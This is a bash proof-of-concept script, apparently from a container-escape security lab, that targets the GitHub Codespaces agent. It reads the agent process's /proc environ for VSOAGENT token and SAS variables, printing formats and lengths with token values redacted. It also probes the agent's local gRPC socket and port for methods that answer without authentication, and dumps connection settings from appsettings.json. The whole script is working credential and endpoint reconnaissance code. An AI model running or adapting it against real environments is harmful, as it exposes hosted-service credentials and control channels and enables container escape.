#!/usr/bin/env bash
set +e
OUT=/workspaces/container-escape-lab/poc-agent-cred.txt
{
echo "AGENT-CRED POC $(date -u +%FT%TZ) — format-presence only, values never printed"
AP=$(for p in /proc/[0-9]*/; do c=$(cat $p/comm 2>/dev/null); [ "$c" = codespaces ] && echo "${p%/}" && break; done)
echo "agent pid: $AP"
if [ -n "$AP" ]; then
  echo "== [P1] VSOAGENT_* env vars: name | value length | format signature (value NOT printed)"
  tr '\0' '\n' < $AP/environ 2>/dev/null | grep '^VSOAGENT' | python3 -c "
import sys
for l in sys.stdin.read().splitlines():
    k, _, v = l.partition('=')
    if any(x in k.lower() for x in ('token', 'sas')):
        sig = 'azure-sas(url-params)' if ('sig=' in v and 'se=' in v) else ('jwt-3seg' if v.count('.') == 2 else 'opaque')
        print(f'{k} | len={len(v)} | format={sig} | value=REDACTED')
    else:
        print(f'{k} = {v[:80]}')
"
fi
echo "== [P2] cs-agent.sock unauthenticated gRPC method probing (auth model mapping)"
for sm in \
  'github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL' \
  'CloudEnvironmentsService/GetCloudEnvironment' \
  'codespaces.agent.v1.PortForwardingService/ForwardPort' \
  'session.v1.SessionService/GetSession'; do
  for ep in 'http://127.0.0.1:16634' 'unix:/workspaces/.codespaces/shared/cs-agent.sock'; do
    if [[ "$ep" == http* ]]; then
      C=$(curl -sS -m 3 --http2-prior-knowledge -o /tmp/p.out -w "%{http_code}" -X POST \
        -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary $'\x00' "$ep/$sm" 2>/dev/null)
      B=$(head -c 60 /tmp/p.out | tr -d '\0' | tr '\n' ' ')
    else
      C=$(curl -sS -m 3 --unix-socket "${ep#unix:}" --http2-prior-knowledge -o /tmp/p.out -w "%{http_code}" -X POST \
        -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary $'\x00' "http://localhost/$sm" 2>/dev/null)
      B=$(head -c 60 /tmp/p.out | tr -d '\0' | tr '\n' ' ')
    fi
    [ "$C" != "000" ] && echo "$ep /$sm -> $C :: $B"
  done
done
echo "== [P3] appsettings.json: connection-related keys (values redacted)"
python3 -c "
import re, json
raw = open('/.codespaces/bin/appsettings.json', errors='replace').read()
cleaned = re.sub(r'^\s*//.*\$', '', raw, flags=re.M)
cleaned = re.sub(r'/\*.*?\*/', '', cleaned, flags=re.S)
d = json.loads(cleaned)
def walk(o, pre=''):
    if isinstance(o, dict):
        for k, v in o.items():
            if isinstance(v, (dict, list)):
                walk(v, pre + k + '.')
            else:
                s = str(v)
                if any(x in k.lower() for x in ('uri', 'url', 'host', 'endpoint', 'name', 'port')):
                    print(pre + k + ' = ' + s[:120])
walk(d)
" 2>&1 | head -15
echo "POC DONE $(date -u +%FT%TZ)"
} > "$OUT" 2>&1
exit 0
